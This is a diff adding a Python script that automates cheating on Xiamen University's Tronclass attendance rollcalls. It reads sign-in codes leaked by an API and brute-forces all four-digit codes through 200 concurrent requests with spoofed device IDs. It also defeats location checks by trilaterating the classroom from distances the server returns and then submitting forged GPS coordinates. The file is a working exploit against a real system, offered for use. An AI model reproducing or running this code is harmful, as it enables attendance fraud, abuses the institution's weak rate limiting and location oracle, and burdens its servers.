@@ -1,0 +1,271 @@
+import uuid
+import time
+import math
+import asyncio
+import requests
+import aiohttp
+from aiohttp import CookieJar
+
+base_url = "https://lnt.xmu.edu.cn"
+headers = {
+    "User-Agent": (
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+        "AppleWebKit/537.36 (KHTML, like Gecko) "
+        "Chrome/150.0.0.0 Safari/537.36"
+    ),
+    "Accept": "application/json, text/plain, */*",
+    "Accept-Language": "zh-CN,zh;q=0.9",
+    "Referer": "https://ids.xmu.edu.cn/authserver/login",
+}
+
+def find_number_code(data, depth=0, max_depth=10):
+    """Extract number_code from nested dict/list API responses.
+
+    Args:
+        data: Parsed JSON payload from Tronclass APIs.
+        depth: Current recursive depth when traversing nested structures.
+        max_depth: Maximum depth allowed for traversal to avoid pathological recursion.
+
+    Returns:
+        str or None: The first discovered number_code value, or None if not found.
+    """
+    if depth > max_depth:
+        return None
+    if isinstance(data, dict):
+        number_code = data.get("number_code")
+        if number_code is not None:
+            return str(number_code)
+        for value in data.values():
+            nested_code = find_number_code(value, depth + 1, max_depth)
+            if nested_code:
+                return nested_code
+    elif isinstance(data, list):
+        for item in data:
+            nested_code = find_number_code(item, depth + 1, max_depth)
+            if nested_code:
+                return nested_code
+    return None
+
+def send_code(in_session, rollcall_id, max_retries=1):
+    code_url = f"{base_url}/api/rollcall/{rollcall_id}/student_rollcalls"
+    answer_url = f"{base_url}/api/rollcall/{rollcall_id}/answer_number_rollcall"
+    request_headers = in_session.headers
+
+    for attempt in range(max_retries + 1):
+        if attempt > 0:
+            print(f"Retrying send_code (attempt {attempt + 1}/{max_retries + 1})...")
+        print("Trying number code from API...")
+        t00 = time.time()
+        try:
+            code_response = in_session.get(code_url, headers=request_headers, timeout=10)
+            if code_response.status_code != 200:
+                t01 = time.time()
+                print(f"Failed to get number code. Status: {code_response.status_code}\nTime: {t01 - t00:.2f} s.")
+                continue
+            code_data = code_response.json()
+        except requests.RequestException as e:
+            t01 = time.time()
+            print(f"Failed to request number code API: {e}\nTime: {t01 - t00:.2f} s.")
+            continue
+        except ValueError as e:
+            t01 = time.time()
+            print(f"Failed to parse number code API response: {e}\nTime: {t01 - t00:.2f} s.")
+            continue
+
+        number_code = find_number_code(code_data)
+        if not number_code:
+            t01 = time.time()
+            print(f"Failed to get number code. 'number_code' not found in API response.\nTime: {t01 - t00:.2f} s.")
+            continue
+
+        payload = {
+            "deviceId": str(uuid.uuid4()),
+            "numberCode": number_code
+        }
+        try:
+            response = in_session.put(answer_url, json=payload, headers=request_headers, timeout=10)
+            if response.status_code == 200:
+                print("Number code rollcall answered successfully.\nNumber code: ", number_code)
+                time.sleep(5)
+                t01 = time.time()
+                print(f"Time: {t01 - t00:.2f} s.")
+                return True, number_code
+            t01 = time.time()
+            print(f"Failed to submit number code. Status: {response.status_code}\nTime: {t01 - t00:.2f} s.")
+        except requests.RequestException as e:
+            t01 = time.time()
+            print(f"Failed to submit number code: {e}\nTime: {t01 - t00:.2f} s.")
+
+    return False, None
+
+def send_code_bruteforce(in_session, rollcall_id):
+    """暴力破解数字签到码（0000-9999 并发尝试）"""
+    url = f"{base_url}/api/rollcall/{rollcall_id}/answer_number_rollcall"
+    print("Brute-forcing number code (0000-9999)...")
+    t00 = time.time()
+
+    async def put_request(i, aio_session, stop_flag, answer_url, sem):
+        if stop_flag.is_set():
+            return None
+        async with sem:
+            if stop_flag.is_set():
+                return None
+            payload = {"deviceId": str(uuid.uuid4()), "numberCode": str(i).zfill(4)}
+            try:
+                async with aio_session.put(answer_url, json=payload) as r:
+                    if r.status == 200:
+                        stop_flag.set()
+                        return str(i).zfill(4)
+            except Exception:
+                pass
+            return None
+
+    async def main():
+        stop_flag = asyncio.Event()
+        sem = asyncio.Semaphore(200)
+        cookie_jar = CookieJar()
+        for c in in_session.cookies:
+            cookie_jar.update_cookies({c.name: c.value})
+        async with aiohttp.ClientSession(headers=dict(in_session.headers), cookie_jar=cookie_jar) as aio_session:
+            tasks = [asyncio.create_task(put_request(i, aio_session, stop_flag, url, sem)) for i in range(10000)]
+            try:
+                for coro in asyncio.as_completed(tasks):
+                    res = await coro
+                    if res:
+                        t01 = time.time()
+                        print(f"Number code cracked! Code: {res}, Time: {t01 - t00:.2f}s")
+                        return True, res
+            finally:
+                for t in tasks:
+                    if not t.done():
+                        t.cancel()
+        t01 = time.time()
+        print(f"Brute force failed. Time: {t01 - t00:.2f}s")
+        return False, None
+
+    return asyncio.run(main())
+
+def send_radar(in_session, rollcall_id, max_retries=1):
+    url = f"{base_url}/api/rollcall/{rollcall_id}/answer"
+
+    def make_payload(lat, lon):
+        return {
+            "accuracy": 35,
+            "altitude": 0,
+            "altitudeAccuracy": None,
+            "deviceId": str(uuid.uuid4()),
+            "heading": None,
+            "latitude": lat,
+            "longitude": lon,
+            "speed": None
+        }
+
+    def safe_put(session, url, payload, headers):
+        """带异常捕获的 PUT 请求"""
+        try:
+            return session.put(url, json=payload, headers=headers, timeout=10)
+        except requests.RequestException as e:
+            print(f"Network error during radar PUT: {e}")
+            return None
+
+    for attempt in range(max_retries + 1):
+        if attempt > 0:
+            print(f"Retrying send_radar (attempt {attempt + 1}/{max_retries + 1})...")
+
+        lat_1, lat_2 = 24.3, 24.6
+        lon_1, lon_2 = 118.0, 118.2
+
+        res_1 = safe_put(in_session, url, make_payload(lat_1, lon_1), headers)
+        if res_1 is not None and res_1.status_code == 200:
+            return True
+
+        res_2 = safe_put(in_session, url, make_payload(lat_2, lon_2), headers)
+        if res_2 is not None and res_2.status_code == 200:
+            return True
+
+        def get_distance_from_res(res):
+            if res is None:
+                return None
+            try:
+                data = res.json()
+                if isinstance(data, dict):
+                    return data.get("distance")
+            except ValueError:
+                pass
+            return None
+
+        distance_1 = get_distance_from_res(res_1)
+        distance_2 = get_distance_from_res(res_2)
+
+        if distance_1 is None or distance_2 is None:
+            print("Failed to get valid distance from API responses.")
+            continue
+
+        def latlon_to_xy(lat, lon, lat0, lon0):
+            R = 6371000
+            x = math.radians(lon - lon0) * R * math.cos(math.radians(lat0))
+            y = math.radians(lat - lat0) * R
+            return x, y
+
+        def xy_to_latlon(x, y, lat0, lon0):
+            R = 6371000
+            lat = lat0 + math.degrees(y / R)
+            lon = lon0 + math.degrees(x / (R * math.cos(math.radians(lat0))))
+            return lat, lon
+
+        def circle_intersections(x1, y1, d1, x2, y2, d2):
+            D = math.hypot(x2 - x1, y2 - y1)
+
+            if D > d1 + d2 or D < abs(d1 - d2):
+                return None
+
+            a = (d1**2 - d2**2 + D**2) / (2 * D)
+            h = math.sqrt(d1**2 - a**2)
+
+            xm = x1 + a * (x2 - x1) / D
+            ym = y1 + a * (y2 - y1) / D
+
+            rx = -(y2 - y1) * (h / D)
+            ry = (x2 - x1) * (h / D)
+
+            p1 = (xm + rx, ym + ry)
+            p2 = (xm - rx, ym - ry)
+            return p1, p2
+
+        def solve_two_points(lat1, lon1, lat2, lon2, d1, d2):
+            lat0 = (lat1 + lat2) / 2
+            lon0 = (lon1 + lon2) / 2
+            x1, y1 = latlon_to_xy(lat1, lon1, lat0, lon0)
+            x2, y2 = latlon_to_xy(lat2, lon2, lat0, lon0)
+
+            sols = circle_intersections(x1, y1, d1, x2, y2, d2)
+            if sols is None:
+                return None
+
+            p1 = xy_to_latlon(sols[0][0], sols[0][1], lat0, lon0)
+            p2 = xy_to_latlon(sols[1][0], sols[1][1], lat0, lon0)
+            return p1, p2
+
+        resolutions = solve_two_points(lat_1, lon_1, lat_2, lon_2, distance_1, distance_2)
+        if resolutions:
+            ((sol_x_1, sol_y_1), (sol_x_2, sol_y_2)) = resolutions
+        else:
+            continue
+
+        payload_1 = make_payload(sol_x_1, sol_y_1)
+        payload_2 = make_payload(sol_x_2, sol_y_2)
+
+        res_3 = safe_put(in_session, url, payload_1, headers)
+        if res_3 is not None and res_3.status_code == 200:
+            return True
+        elif res_3 is not None:
+            try:
+                print(res_3.json())
+            except ValueError:
+                print(f"Failed to parse response: {res_3.text}")
+
+        res_4 = safe_put(in_session, url, payload_2, headers)
+        if res_4 is not None and res_4.status_code == 200:
+            return True
+
+    return False
